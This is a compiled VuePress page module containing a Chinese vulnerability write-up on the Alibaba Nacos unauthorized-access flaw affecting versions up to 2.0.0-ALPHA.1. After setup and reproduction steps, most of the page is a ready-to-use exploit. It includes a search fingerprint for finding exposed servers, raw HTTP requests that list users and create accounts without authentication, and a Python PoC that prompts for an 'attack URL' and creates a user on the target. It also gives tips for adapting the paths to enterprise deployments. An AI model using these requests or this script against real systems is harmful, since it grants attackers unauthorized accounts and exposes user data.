import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c as l,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const c={},u=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Nacos &lt;= 2.0.0-ALPHA.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Nacos&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,7),r={href:"https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1",target:"_blank",rel:"noopener noreferrer"},d=t(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1
<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> nacos-server-2.0.0-ALPHA.1.tar.gz
./startup.sh <span class="token parameter variable">-m</span> standalone
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),k={href:"http://xxx.xxx.xxx.xxx:8848/nacos",target:"_blank",rel:"noopener noreferrer"},v=n("strong",null,"nacos/nacos",-1),m=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202102003931.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),b=n("h2",{id:"漏洞复现",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞复现","aria-hidden":"true"},"#"),s(" 漏洞复现")],-1),g=n("p",null,"可以再项目的 issues 中看到大量的关于越权的安全问题的讨论",-1),h={href:"https://github.com/alibaba/nacos/issues/1105",target:"_blank",rel:"noopener noreferrer"},x=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202102003894.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),_=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202102003898.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),f=n("p",null,"这里我们在登录后任意一个位置看一下请求，并在未授权的情况下看是否可以访问",-1),q=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202102004781.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),w=n("p",null,"这里的请求url简化为",-1),y={href:"http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=",target:"_blank",rel:"noopener noreferrer"},A=n("p",null,"退出用户后在前台访问这个 url",-1),z=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202102004013.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),N=n("p",null,[s("可以发现以及泄露了 "),n("strong",null,"ip节点"),s(" 等数据")],-1),P=n("p",null,"同样我们查看用户列表的请求并在前台访问",-1),S={href:"http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9",target:"_blank",rel:"noopener noreferrer"},C=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202102004595.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202102004600.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里可以发现对用户的请求是完全没有过滤的，可以通过未授权的情况获取用户的敏感信息</p><p>我们尝试创建用户并抓包</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202102004325.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>返回下列创建成功</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>{&quot;code&quot;:200,&quot;message&quot;:&quot;create user ok!&quot;,&quot;data&quot;:null}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>同样的我们简化请求</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /nacos/v1/auth/users?
username=peiqi&amp;password=peiqi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202102004662.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202102004665.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>看到有文章说要加上<strong>User-Agent请求头</strong></p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>User-Agent: Nacos-Server
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但是大量测试之后发现好像是无关紧要的，没有请求头同样可以创建用户</p><ul><li>同样的原理也可以用于修改密码添加配置等</li></ul><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 添加用户
POST /nacos/v1/auth/users HTTP/1.1
Host: 127.0.0.1
User-Agent: Nacos-Server
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/
*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

username=aaaa&amp;password=bbbb
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 查看用户
GET /nacos/v1/auth/users?pageNo=1&amp;pageSize=100 HTTP/1.1
Host: 127.0.0.1
User-Agent: Nacos-Server
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;
q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>注意下大部分企业的 nacos的url为 /v1/auth/users ，而不是 /nacos/v1/auth/users</li><li>可以按目标情况自行修改</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: Nacos &lt;= 2.0.0-ALPHA.1                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># vuln_url = target_url + &quot;/nacos/v1/auth/users&quot;</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/v1/auth/users&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Nacos-Server&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token string">&quot;username=peiqi{}&amp;password=peiqi&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在请求 {}/nacos/v1/auth/users \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;create user ok!&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text <span class="token keyword">and</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 目标 {}存在漏洞 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功创建账户 peiqi{} peiqi\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 创建用户请求失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败 \\033[0m&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202102004659.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,21);function T(L,U){const a=p("ExternalLinkIcon");return o(),l("div",null,[u,n("p",null,[n("a",r,[s("https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1"),e(a)])]),d,n("p",null,[s("然后访问 "),n("a",k,[s("http://xxx.xxx.xxx.xxx:8848/nacos"),e(a)]),s(" 即可，默认账号密码 "),v]),m,b,g,n("p",null,[n("a",h,[s("https://github.com/alibaba/nacos/issues/1105"),e(a)])]),x,_,f,q,w,n("p",null,[n("a",y,[s("http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword="),e(a)])]),A,z,N,P,n("p",null,[n("a",S,[s("http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9"),e(a)])]),C])}const I=i(c,[["render",T],["__file","Nacos 未授权访问漏洞.html.vue"]]);export{I as default};
